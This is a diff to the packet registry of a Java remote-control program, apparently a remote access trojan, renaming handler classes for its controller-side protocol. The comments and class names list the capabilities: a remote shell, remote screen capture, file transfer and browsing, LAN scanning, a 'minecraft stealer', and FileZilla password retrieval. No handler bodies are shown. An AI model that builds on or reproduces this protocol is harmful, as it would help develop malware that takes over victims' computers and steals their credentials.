@@ -20,17 +20,17 @@ public class Packets {
 
 	private static void reload() {
 		incomingPackets.clear();
-		incomingPackets.put(/* "LOCALE" */(byte) 10, PacketLOCALE.class);
+		incomingPackets.put(/* "LOCALE" */(byte) 10, Packet10InitDefaultLocale.class);
 		incomingPackets.put(/* "INSTLOCALES" */(byte) 11, PacketINSTLOCALES.class);
 		incomingPackets.put(/* "DISCONNECT" */(byte) 12, PacketDISCONNECT.class); // disconnect
-		incomingPackets.put(/* "STAT" */(byte) 13, PacketSTAT.class); // status
-		incomingPackets.put(/* "COMPUTERNAME" */(byte) 14, PacketCOMPUTERNAME.class); // computername
-		incomingPackets.put(/* "SERVERID" */(byte) 15, PacketSERVERID.class); // server
+		incomingPackets.put(/* "STAT" */(byte) 13, Packet13Status.class); // status
+		incomingPackets.put(/* "COMPUTERNAME" */(byte) 14, Packet14InitComputerName.class); // computername
+		incomingPackets.put(/* "SERVERID" */(byte) 15, Packet15InitServerID.class); // server
 																				// id
-		incomingPackets.put(/* "OSNAME" */(byte) 16, PacketOSNAME.class); // os
+		incomingPackets.put(/* "OSNAME" */(byte) 16, Packet16InitOperatingSystem.class); // os
 																			// name
-		incomingPackets.put(/* "IMAGECOMING" */(byte) 17, PacketIMAGECOMING.class); // image
-		incomingPackets.put(/* "SINGLEIMAGECOMING" */(byte) 18, PacketSINGLEIMAGECOMING.class); // single
+		incomingPackets.put(/* "IMAGECOMING" */(byte) 17, Packet17RemoteScreen.class); // image
+		incomingPackets.put(/* "SINGLEIMAGECOMING" */(byte) 18, Packet18OneRemoteScreen.class); // single
 																									// image
 		incomingPackets.put(/* "FOLDERLIST" */(byte) 19, PacketFOLDERLIST.class); // list
 																					// of
@@ -38,20 +38,20 @@ public class Packets {
 																					// in
 																					// dir
 		incomingPackets.put(/* "PROCESS" */(byte) 20, PacketPROCESS.class); // process
-		incomingPackets.put(/* "CMD" */(byte) 21, PacketCMD.class); // command
+		incomingPackets.put(/* "CMD" */(byte) 21, Packet21RemoteShell.class); // command
 																		// prompt
 																		// line
 		incomingPackets.put(/* "USERNAME" */(byte) 22, Packet22InitUsername.class); // username
-		incomingPackets.put(/* "SERVERPATH" */(byte) 23, PacketSERVERPATH.class); // server
+		incomingPackets.put(/* "SERVERPATH" */(byte) 23, Packet23InitInstallPath.class); // server
 																					// path
 		incomingPackets.put(/* "HERERAM" */(byte) 24, PacketHERERAM.class); // ram
-		incomingPackets.put(/* "JAVAVER" */(byte) 25, PacketJAVAVER.class); // java
+		incomingPackets.put(/* "JAVAVER" */(byte) 25, Packet25InitJavaVersion.class); // java
 																				// version
-		incomingPackets.put(/* "JAVAPATH" */(byte) 26, PacketJAVAPATH.class); // javapath
+		incomingPackets.put(/* "JAVAPATH" */(byte) 26, Packet26InitJavaPath.class); // javapath
 		incomingPackets.put(/* "URLSTAT" */(byte) 27, PacketURLSTAT.class); // adv
 																				// downloader
 																				// info
-		incomingPackets.put(/* "LOCALIP" */(byte) 28, PacketLOCALIP.class); // local
+		incomingPackets.put(/* "LOCALIP" */(byte) 28, Packet28InitLanAddress.class); // local
 																				// ip
 		incomingPackets.put(/* "FILE" */(byte) 29, PacketFILE.class); // file
 																		// transfer
@@ -63,9 +63,9 @@ public class Packets {
 																				// env
 																				// /
 																				// prop
-		incomingPackets.put(/* "THUMBNAIL" */(byte) 33, PacketTHUMBNAIL.class); // tumbnail
+		incomingPackets.put(/* "THUMBNAIL" */(byte) 33, Packet33Thumbnail.class); // tumbnail
 		incomingPackets.put(/* "DIR" */(byte) 34, PacketDIR.class); // get dir
-		incomingPackets.put(/* "CHAT" */(byte) 35, PacketCHAT.class); // chat
+		incomingPackets.put(/* "CHAT" */(byte) 35, Packet35ChatMessage.class); // chat
 		incomingPackets.put(/* "MC" */(byte) 36, PacketMC.class); // minecraft
 																	// stealer
 		incomingPackets.put(/* "FF" */(byte) 37, PacketFF.class); // file
@@ -82,18 +82,18 @@ public class Packets {
 																				// contents
 		incomingPackets.put(/* "FC" */(byte) 42, PacketFC.class); // file
 																	// preview
-		incomingPackets.put(/* "IC" */(byte) 43, PacketIC.class); // image
+		incomingPackets.put(/* "IC" */(byte) 43, Packet43PreviewImage.class); // image
 																	// preview
 		incomingPackets.put(/* "JVM" */(byte) 44, PacketJVM.class); // JVM info
 		incomingPackets.put(/* "ZIP" */(byte) 45, PacketZIP.class); // zip
 																		// preview
 		incomingPackets.put(/* "MD5" */(byte) 46, PacketMD5.class); // file md5
-		incomingPackets.put(/* "COUNTRY" */(byte) 47, PacketCOUNTRY.class); // user.country
+		incomingPackets.put(/* "COUNTRY" */(byte) 47, Packet47InitCountry.class); // user.country
 																				// backup
-		incomingPackets.put(/* "FZ" */(byte) 48, PacketFZ.class); // filezilla
-		incomingPackets.put(/* "LAN" */(byte) 49, PacketLAN.class); // lan view
+		incomingPackets.put(/* "FZ" */(byte) 48, Packet48FileZillaPassword.class); // filezilla
+		incomingPackets.put(/* "LAN" */(byte) 49, Packet49LanDevices.class); // lan view
 		incomingPackets.put(/* "IPC" */(byte) 50, PacketIPC.class); // ipconfig
-		incomingPackets.put(/* "APORT" */(byte) 51, PacketAPORT.class); // active
+		incomingPackets.put(/* "APORT" */(byte) 51, Packet51ActivePort.class); // active
 																			// port
 		incomingPackets.put(/* "WINSER" */(byte) 52, PacketWINSER.class); // windows
 																			// service
@@ -116,14 +116,14 @@ public class Packets {
 		incomingPackets.put(/* "IMGLIST" */(byte) 59, PacketIMGLIST.class); // thumbnail
 																				// preview
 		incomingPackets.put(/* "ERROR" */(byte) 60, PacketERROR.class); // error
-		incomingPackets.put(/* "MONITOR" */(byte) 61, PacketMONITOR.class); // monitors
+		incomingPackets.put(/* "MONITOR" */(byte) 61, Packet61InitMonitors.class); // monitors
 																				// listing
-		incomingPackets.put(/* "DRIVES" */(byte) 62, PacketDRIVES.class); // drives
+		incomingPackets.put(/* "DRIVES" */(byte) 62, Packet62InitDrives.class); // drives
 																			// listing
-		incomingPackets.put(/* "RAM" */(byte) 63, PacketRAM.class); // ram
-		incomingPackets.put(/* "APS" */(byte) 64, PacketAPS.class); // available
+		incomingPackets.put(/* "RAM" */(byte) 63, Packet63InitRAM.class); // ram
+		incomingPackets.put(/* "APS" */(byte) 64, Packet64InitAvailableProcessors.class); // available
 																		// processors
-		incomingPackets.put(/* "ERRLOG" */(byte) 65, PacketERRLOG.class); // error
+		incomingPackets.put(/* "ERRLOG" */(byte) 65, Packet65ErrorLog.class); // error
 																			// log
 																			// file
 		incomingPackets.put(/* "CONFIG" */(byte) 66, PacketCONFIG.class); // config
